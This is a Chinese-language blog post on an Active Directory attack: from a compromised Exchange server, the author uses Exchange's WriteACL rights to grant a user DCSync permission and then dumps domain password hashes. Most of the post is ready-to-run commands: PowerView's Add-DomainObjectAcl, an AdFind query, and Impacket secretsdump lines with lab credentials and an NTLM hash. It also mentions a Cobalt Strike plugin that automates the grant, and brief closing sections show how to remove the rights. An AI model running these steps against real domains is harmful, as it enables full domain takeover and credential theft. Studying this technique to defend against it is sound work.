**目录**

[赋予指定用户Dcsync权限，接管域控](#t0 "赋予指定用户Dcsync权限，接管域控")

[移除指定用户dcsync权限](#t1 "移除指定用户dcsync权限")

[去除Exchange修改Dcysnc的权限](#t2 "去除Exchange修改Dcysnc的权限")

* * *

由于安装Exchange后，Exchange在Active Directory域中具有高权限，Exchange的本地计算机账户会被加入用户组Exchange Trusted Subsystem，Exchange Trusted Subsystem用户组又隶属于Exchange Windows Permissions。Exchange Windows Permissions这个组默认对域有WriteACL权限。所以当我们拿下Exchange服务器的时候，就可以尝试使用WriteACL赋予指定用户Dcsync的权限.

![](https://img-blog.csdnimg.cn/20210308123648955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2021030812382233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2021030815242066.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 赋予指定用户Dcsync权限，接管域控

当攻击者获取了Exchange所在服务器的system权限后，攻击者可以通过修改域内的ACL权限为指定帐户授予Dcsync权限，该帐户即可以使用Dcsync转储域中的所有域用户密码[哈希](https://so.csdn.net/so/search?q=%E5%93%88%E5%B8%8C&spm=1001.2101.3001.7020)，相当于接管了整个域。

如下，hack为域内普通用户

![](https://img-blog.csdnimg.cn/20210308112823477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

在Exchange服务器上，通过执行如下命令，给指定用户hack赋予dcsync权限

```
#Empire下的powerview.ps1脚本      
Import-Module .\powerview.ps1;      
Add-DomainObjectAcl -TargetIdentity 'DC=xie,DC=com' -PrincipalIde hack -Rights DCSync -Verbose       
#移除指定用户的dcsync权限      
Remove-DomainObjectAcl -TargetIdentity 'DC=xie,DC=com' -PrincipalIde hack -Rights DCSync -Verbose
```


![](https://img-blog.csdnimg.cn/20210308112403124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

查询域内具备Dcsync权限的用户，可以看到已经有xie\\hack了

```
AdFind.exe -s subtree -b "DC=xie,DC=com" nTSecurityDescriptor -sddl -sddlfilter ;;;"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2";; -recmute -resolvesids
```


![](https://img-blog.csdnimg.cn/20210308125856377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

hack用户拥有dcsync权限后，即可导出域内哈希。

```
python3 secretsdump.py xie.com/hack:P@ss123@10.211.55.4 -dc-ip 10.211.55.4 -just-dc-user administrator
```


![](https://img-blog.csdnimg.cn/20210308112725881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我已经将该功能集成在CS插件里面，一键化给指定用户添加dcsync权限。

![](https://img-blog.csdnimg.cn/20210308114212817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

或者可以直接给mail$ 机器账号添加dcsync权限，然后导出域哈希

![](https://img-blog.csdnimg.cn/2021031422350987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
python3 secretsdump.py xie.com/mail\$@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:c23f4123693ea9f2bdba4bf6ee269dcd -dc-ip 10.211.55.4 -just-dc-user administrator
```


![](https://img-blog.csdnimg.cn/20210314223720716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 移除指定用户dcsync权限

```
Import-module .\Remove-DomainObjectAcl.ps1      
Remove-DomainObjectAcl -TargetIdentity "DC=xie,DC=com" -PrincipalIdentity test -Rights DCSync
```


![](https://img-blog.csdnimg.cn/2021070122471386.png)

### 去除Exchange修改Dcysnc的权限

```
.\Fix-DomainObjectDACL.ps1 -Fix
```


![](https://img-blog.csdnimg.cn/20210701223737680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

 相关文章：[渗透测试中的Exchange](https://www.sohu.com/a/440301325_750628 "渗透测试中的Exchange")

                   [微软Exchange爆出0day漏洞，来看POC和技术细节](https://www.freebuf.com/vuls/195162.html "微软Exchange爆出0day漏洞，来看POC和技术细节")